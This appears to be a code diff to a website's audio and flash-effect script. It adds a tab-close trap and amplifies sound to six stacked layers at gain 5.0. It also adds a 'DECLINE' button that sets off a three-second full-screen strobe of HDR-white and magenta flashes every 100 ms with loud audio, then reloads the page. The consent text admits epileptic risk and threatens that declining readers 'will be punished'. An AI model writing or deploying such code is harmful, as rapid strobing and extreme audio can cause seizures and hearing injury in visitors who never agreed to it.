@@ -32,13 +32,36 @@
         'intro1.wav', 'intro2.wav', 'intro3.wav', 'intro4.wav'
     ];
 
-    // CONFIG: LOUDNESS SETTINGS
-    // Gain of 5.0 is already loud.
-    // Stacking it 5 times creates constructive interference 
-    // effectively resulting in a 25x amplitude spike.
     const VOLUME_GAIN = 5.0; 
-    const AUDIO_LAYERS = 6; // How many copies to play at once
+    const AUDIO_LAYERS = 6; 
 
+   /* =========================================
+       1.5. PREVENT TAB CLOSE (With Link Exception)
+    ========================================= */
+    let bypassWarning = false;
+
+    // 1. Detect if the user clicked a link
+    window.addEventListener('click', (e) => {
+        // If the click is on an <a> tag (or inside one)
+        if (e.target.closest('a')) {
+            bypassWarning = true;
+            
+            // Safety: Re-enable the warning after 1 second 
+            // (in case the link didn't actually leave the page, e.g. anchor links #)
+            setTimeout(() => {
+                bypassWarning = false;
+            }, 1000);
+        }
+    });
+
+    // 2. Trigger the browser warning unless it was a link
+    window.addEventListener('beforeunload', (e) => {
+        if (!bypassWarning) {
+            e.preventDefault(); 
+            e.returnValue = ''; 
+        }
+    });
+   
     /* =========================================
        2. STATE MANAGEMENT
     ========================================= */
@@ -79,8 +102,17 @@
         .consent-text h3 { margin: 0; color: #ff6ec7; font-size: 1.8rem; text-transform: uppercase; text-shadow: 2px 2px 0 #000; }
         .consent-text p { margin: 5px 0 0 0; font-size: 1.2rem; color: #ccc; }
         #loading-status { color: #ff92df; font-weight: bold; }
+
+        .btn-group { display: flex; gap: 10px; }
+        .mc-btn {
+            background: #000; color: #fff; border: 2px solid #fff;
+            padding: 10px 20px; font-family: inherit; font-size: 1.2rem;
+            cursor: pointer; text-transform: uppercase;
+        }
+        .mc-btn:hover:not(:disabled) { background: #fff; color: #000; }
+        .mc-btn:disabled { opacity: 0.5; cursor: wait; }
         
-        /* Warning Flash */
+        /* Main Warning Flash (Magenta) */
         #warning-flash {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background-color: rgba(242, 0, 255, 1); 
@@ -89,6 +121,18 @@
             z-index: 2147483647; pointer-events: none; opacity: 0;
             transition: opacity 0.05s ease-out; 
         }
+        
+        /* PRE-FLASH (HDR P3 White) */
+        #hdr-pre-flash {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background-color: white; 
+            background-color: color(display-p3 1 1 1); 
+            z-index: 2147483648; 
+            pointer-events: none; opacity: 0;
+            transition: none;
+            mix-blend-mode: normal;
+        }
+
         #warning-text {
             font-family: 'VT323', monospace; font-size: 6rem;
             font-weight: 900; text-transform: uppercase;
@@ -97,6 +141,7 @@
         }
         @media (max-width: 600px) {
             #consent-box { flex-direction: column; text-align: center; }
+            .btn-group { width: 100%; flex-direction: column; }
             #consent-box button { width: 100%; }
         }
         @keyframes shake {
@@ -105,6 +150,10 @@
         }
     `;
     document.head.appendChild(style);
+
+    const preFlashOverlay = document.createElement('div');
+    preFlashOverlay.id = 'hdr-pre-flash';
+    document.body.appendChild(preFlashOverlay);
 
     const flashOverlay = document.createElement('div');
     flashOverlay.id = 'warning-flash';
@@ -124,11 +173,14 @@
     consentOverlay.innerHTML = `
         <div id="consent-box">
             <div class="consent-text">
-                <h3>₊˚⊹ᰔ✨ Consent policy</h3>
-                <p>This site is using media playback feature to enhance reader experience, it is required to view the site.</p>
+                <h3>₊˚⊹ᰔ✨ Consent notices</h3>
+                <p>This site is using media playback feature to enhance reader experience. Contents might be unsuitable for individuals with epileptic photosensitivity and the reader understands this risk otherwise will be punished.</p>
                 <p id="loading-status">Loading Assets...</p>
             </div>
-            <button id="accept-btn" class="mc-btn" disabled>INITIALIZE</button>
+            <div class="btn-group">
+                <button id="decline-btn" class="mc-btn" disabled>DECLINE</button>
+                <button id="accept-btn" class="mc-btn" disabled>INITIALIZE</button>
+            </div>
         </div>
     `;
     document.body.appendChild(consentOverlay);
@@ -140,7 +192,8 @@
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         audioContext = new AudioContext();
 
-        const loadBtn = document.getElementById('accept-btn');
+        const acceptBtn = document.getElementById('accept-btn');
+        const declineBtn = document.getElementById('decline-btn');
         const loadText = document.getElementById('loading-status');
 
         try {
@@ -153,11 +206,15 @@
             audioBuffers = await Promise.all(decodePromises);
             areAssetsLoaded = true;
 
-            loadText.innerText = "Assets Loaded. Click Initialize to enter.";
-            loadBtn.innerText = "I ACCEPT";
-            loadBtn.disabled = false;
+            loadText.innerText = "Assets Loaded. Choose an option.";
+            acceptBtn.innerText = "I ACCEPT";
             
-            loadBtn.addEventListener('click', () => {
+            // Enable both buttons
+            acceptBtn.disabled = false;
+            declineBtn.disabled = false;
+            
+            // --- ACCEPT LOGIC ---
+            acceptBtn.addEventListener('click', () => {
                 if (audioContext.state === 'suspended') audioContext.resume();
                 localStorage.setItem(STORAGE_KEY, 'true');
 
@@ -168,35 +225,50 @@
                 }, 300);
             });
 
+            // --- DECLINE LOGIC (CHAOS MODE) ---
+            declineBtn.addEventListener('click', async () => {
+                // 1. Bypass the browser's "Leave Site?" warning
+                bypassWarning = true;
+
+                // 2. Reset Storage
+                localStorage.removeItem(STORAGE_KEY);
+                
+                // 3. Ensure audio is unlocked
+                if (audioContext.state === 'suspended') await audioContext.resume();
+
+                // 4. Disable buttons
+                acceptBtn.disabled = true;
+                declineBtn.disabled = true;
+                
+                // 5. Trigger Chaos Loop (Strobe)
+                const intervalId = setInterval(() => {
+                    // Pass 'true' to force trigger even if playing/not accepted
+                    triggerWarning(null, true); 
+                }, 100); 
+
+                // 6. Reload after 3 seconds
+                setTimeout(() => {
+                    clearInterval(intervalId);
+                    location.reload();
+                }, 3000);
+            });
+
         } catch (error) {
             loadText.innerText = "Failed to load audio.";
             console.error(error);
         }
     }
 
-    /**
-     * MODIFIED: playSound
-     * Now loops AUDIO_LAYERS times to stack the sound waves.
-     */
     function playSound(buffer) {
         if (!audioContext) return;
-
-        // Loop to create multiple overlapping sources
         for (let i = 0; i < AUDIO_LAYERS; i++) {
             const source = audioContext.createBufferSource();
             source.buffer = buffer;
-            
             const gainNode = audioContext.createGain();
             gainNode.gain.value = VOLUME_GAIN; 
-            
             source.connect(gainNode);
             gainNode.connect(audioContext.destination);
-            
-            // Start immediately
             source.start(0);
-
-            // Only attach the 'onended' listener to the LAST layer
-            // to prevent the flag from flipping multiple times
             if (i === AUDIO_LAYERS - 1) {
                 source.onended = () => { isPlaying = false; };
             }
@@ -206,35 +278,52 @@
     /* =========================================
        5. TRIGGER LOGIC
     ========================================= */
-    async function triggerWarning(e) {
-        if (!isAccepted || !areAssetsLoaded || isPlaying) return; 
-
-        if (e && e.target && e.target.closest('#consent-overlay')) return;
-        if (e && e.target && e.target.closest('a')) return;
+    // Added 'force' param to bypass checks for the decline button chaos
+    async function triggerWarning(e, force = false) {
+        
+        // If it's a normal trigger (not forced), apply standard checks
+        if (!force) {
+            if (!isAccepted || !areAssetsLoaded || isPlaying) return; 
+            if (e && e.target && e.target.closest('#consent-overlay')) return;
+            if (e && e.target && e.target.closest('a')) return;
+        }
 
         if (audioContext && audioContext.state === 'suspended') {
             await audioContext.resume();
         }
         
-        isPlaying = true; 
+        // Only set locking flag if not in force mode (chaos mode ignores locks)
+        if (!force) isPlaying = true; 
 
-        // 1. Visuals
-        textSpan.innerText = phrases[Math.floor(Math.random() * phrases.length)];
-        flashOverlay.style.opacity = '1';
-        setTimeout(() => { flashOverlay.style.opacity = '0'; }, 100);
+        // --- STEP 1: PRE-FLASH (T = 0ms) ---
+        preFlashOverlay.style.opacity = '1';
 
-        // 2. Audio
-        let newIndex;
-        do {
-            newIndex = Math.floor(Math.random() * audioBuffers.length);
-        } while (newIndex === lastAudioIndex && audioBuffers.length > 1);
-        lastAudioIndex = newIndex;
+        // --- STEP 2: MAIN EXECUTION (T = 5ms) ---
+        setTimeout(() => {
+            textSpan.innerText = phrases[Math.floor(Math.random() * phrases.length)];
+            flashOverlay.style.opacity = '1';
 
-        if (audioBuffers[newIndex]) {
-            playSound(audioBuffers[newIndex]);
-        } else {
-            isPlaying = false;
-        }
+            let newIndex;
+            do {
+                newIndex = Math.floor(Math.random() * audioBuffers.length);
+            } while (newIndex === lastAudioIndex && audioBuffers.length > 1);
+            lastAudioIndex = newIndex;
+
+            if (audioBuffers[newIndex]) {
+                playSound(audioBuffers[newIndex]);
+            } else {
+                isPlaying = false;
+            }
+
+            // Cleanup visuals
+            setTimeout(() => { flashOverlay.style.opacity = '0'; }, 100);
+
+        }, 5);
+
+        // --- STEP 3: PRE-FLASH CLEANUP (T = 25ms) ---
+        setTimeout(() => {
+            preFlashOverlay.style.opacity = '0';
+        }, 25);
     }
 
     /* =========================================
@@ -261,7 +350,6 @@
         if(isAccepted && e.changedTouches.length > 0) {
             const touchEndX = e.changedTouches[0].screenX;
             const touchEndY = e.changedTouches[0].screenY;
-            
             const diffX = Math.abs(touchEndX - touchStartX);
             const diffY = Math.abs(touchEndY - touchStartY);
 
